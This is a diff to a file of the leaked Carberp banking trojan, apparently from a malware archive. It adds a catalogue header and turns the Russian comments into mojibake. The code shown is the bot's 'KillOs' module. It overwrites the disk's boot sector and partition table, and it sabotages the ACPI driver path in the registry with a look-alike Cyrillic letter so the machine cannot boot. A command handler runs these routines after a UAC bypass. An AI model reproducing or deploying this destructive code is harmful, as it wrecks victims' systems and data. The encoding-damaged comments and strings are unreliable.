@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "BotCore.h"
 #include "KillOs_Reboot.h"
 #include "GetApi.h"
@@ -16,7 +27,7 @@
 
 static bool KillOs1()
 {
-	// перезаписывает нулевой сектор, а там находиться Таблица разделов  
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  
 	HANDLE hDest;
 	CHAR p[512];
 	DWORD size;
@@ -38,7 +49,7 @@ static bool KillOs1()
 	return ret != FALSE;
 }
 
-//производит в реестре замену пути к важному файлу
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static bool KillOs2()
 {
 	bool ret = false;
@@ -54,8 +65,8 @@ static bool KillOs2()
 	    LONG res = (LONG)pRegOpenKeyExA( HKEY_LOCAL_MACHINE, path, 0, KEY_ALL_ACCESS, &key );
 	    if( res == ERROR_SUCCESS )
 		{
-			//в AСPI.sys русская буква С (вместо латинской), названия визуально похожи
-			const char* CORRUPTED_PATH = "system32\\drivers\\AСPI.sys";
+			//пїЅ AпїЅPI.sys пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ), пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+			const char* CORRUPTED_PATH = "system32\\drivers\\AпїЅPI.sys";
 			res = (LONG)pRegSetValueExA( key, "ImagePath", 0, REG_SZ, (const BYTE *)CORRUPTED_PATH, m_lstrlen(CORRUPTED_PATH) + 1 );
 	        if( res == ERROR_SUCCESS )
 	        {
@@ -101,7 +112,7 @@ bool ExecuteKillosCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments)
 {
 	DBG( "Execute cmd KillOs" );
 #ifdef UAC_bypassH
-	if( BOT::GetBotType() == BotBypassUAC ) //запустили после обхода UAC
+	if( BOT::GetBotType() == BotBypassUAC ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ UAC
 		return KillOs();
 	else
 		if( !RunBotBypassUAC( 0, 1, 0 ) )
@@ -114,7 +125,7 @@ bool ExecuteKillosCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments)
 
 bool ExecuteRebootCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments)
 {
-	// вернем фалсе, так как в другом случае произойдет перегрузка
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Reboot();
 	return true;
 
